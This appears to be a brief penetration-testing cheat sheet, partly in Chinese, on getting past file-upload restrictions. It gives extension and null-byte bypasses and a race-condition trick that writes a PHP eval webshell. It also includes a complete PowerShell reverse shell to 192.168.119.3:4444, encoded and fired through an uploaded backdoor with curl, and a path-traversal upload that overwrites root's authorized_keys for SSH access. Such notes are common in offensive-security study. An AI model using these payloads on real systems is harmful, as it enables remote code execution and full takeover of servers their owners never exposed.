### File Extensions
```
.phps or .php7
From .php to .pHP
```
### 截断
```
filename.php%00.pdf
```
### 条件竞争绕过
服务器对文件进行检测，如果不符合则删除文件，这其中需要一些时间，我们可以利用这个时间差进行上传木马，要求服务器接收到文件不会重命名。
我们将上传的文件写为：
```
<?php fputs(fopen('shell.php','w'),'<?php eval($_POST[cmd])?>');?>

```
### Powershell reverse shell
```
$Text = '$client = New-Object System.Net.Sockets.TCPClient("192.168.119.3",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
$EncodedText =[Convert]::ToBase64String($Bytes)

curl http://192.168.50.189/meteor/uploads/simple-backdoor.pHP?cmd=powershell%20-enc%20+$EncodedText
```

### Upload non-executable file
```
upload ../../../../../../../root/.ssh/authorized_keys
rm ~/.ssh/known_hosts
ssh -p 2222 -i privatekey root@mountaindesserts.com
```
